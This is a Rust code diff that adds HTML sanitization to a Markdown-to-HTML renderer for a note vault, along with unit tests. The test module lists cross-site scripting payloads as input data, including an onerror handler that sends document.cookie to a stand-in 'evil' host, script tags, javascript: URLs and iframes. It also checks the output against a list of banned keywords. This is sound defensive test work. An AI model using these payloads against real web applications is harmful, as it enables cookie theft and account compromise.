@@ -66,7 +66,36 @@ pub(super) fn render_markdown_html(
 
     let mut html = String::new();
     pulldown_cmark::html::push_html(&mut html, events.into_iter());
-    Ok(html)
+    Ok(sanitize_vault_html(&html))
+}
+
+/// Strip anything executable from Markdown-derived HTML.
+///
+/// A vault ingests external material — web clippings, email, transcripts — so
+/// its Markdown is not trusted input. `pulldown_cmark` passes raw `Event::Html`
+/// and `InlineHtml` through verbatim, and the SPA injects the result with
+/// `innerHTML` from the same origin as the API, so an `<img src=x onerror=...>`
+/// in any note could read every file in the vault and post to the write routes.
+///
+/// Formatting HTML that authors legitimately write (tables, `<br>`, `<sub>`)
+/// survives; scripts, event handlers, and `javascript:` URLs do not.
+pub(super) fn sanitize_vault_html(html: &str) -> String {
+    use std::collections::HashSet;
+    use std::sync::OnceLock;
+
+    static CLEANER: OnceLock<ammonia::Builder<'static>> = OnceLock::new();
+    CLEANER
+        .get_or_init(|| {
+            let mut builder = ammonia::Builder::default();
+            // Syntax highlighting and heading anchors are emitted as classes
+            // by our own renderer, so they have to survive the clean.
+            builder
+                .add_generic_attributes(["class"])
+                .url_schemes(HashSet::from(["http", "https", "mailto", "data"]));
+            builder
+        })
+        .clean(html)
+        .to_string()
 }
 
 pub(super) fn rewrite_markdown_svg_url(
@@ -260,5 +289,62 @@ pub(super) fn highlight_language_name(
         Some("yaml") | Some("yml") => Some(("yaml", lumis::languages::Language::YAML)),
         Some("py") | Some("python") => Some(("python", lumis::languages::Language::Python)),
         _ => None,
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Vault Markdown is untrusted: intake pulls in web clippings, email and
+    /// transcripts, and the SPA injects this HTML with `innerHTML` from the
+    /// same origin as the API.
+    #[test]
+    fn executable_markup_does_not_survive_rendering() {
+        let hostile = [
+            "<img src=x onerror=\"fetch('//evil/'+document.cookie)\">",
+            "<script>alert(1)</script>",
+            "<svg onload=alert(1)>",
+            "[click me](javascript:alert(1))",
+            "<a href=\"javascript:alert(1)\">x</a>",
+            "<iframe src=\"//evil\"></iframe>",
+            "<body onload=alert(1)>",
+        ];
+
+        for markdown in hostile {
+            let html = render_markdown_html(markdown, None, None).unwrap();
+            let lowered = html.to_lowercase();
+            for banned in ["onerror", "onload", "<script", "javascript:", "<iframe"] {
+                assert!(
+                    !lowered.contains(banned),
+                    "`{banned}` survived rendering of `{markdown}` -> {html}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn ordinary_formatting_still_renders() {
+        let html = render_markdown_html(
+            "# Title\n\nSome **bold** text and a [link](https://example.com).\n\n\
+             | a | b |\n| - | - |\n| 1 | 2 |\n",
+            None,
+            None,
+        )
+        .unwrap();
+
+        for expected in ["<h1", "<strong>", "https://example.com", "<table>"] {
+            assert!(html.contains(expected), "`{expected}` missing from {html}");
+        }
+    }
+
+    #[test]
+    fn highlighted_code_keeps_its_classes() {
+        // Sanitizing must not strip the spans our own highlighter emits.
+        let html = render_markdown_html("```rust\nfn main() {}\n```\n", None, None).unwrap();
+        assert!(
+            html.contains("class="),
+            "highlight classes stripped: {html}"
+        );
     }
 }
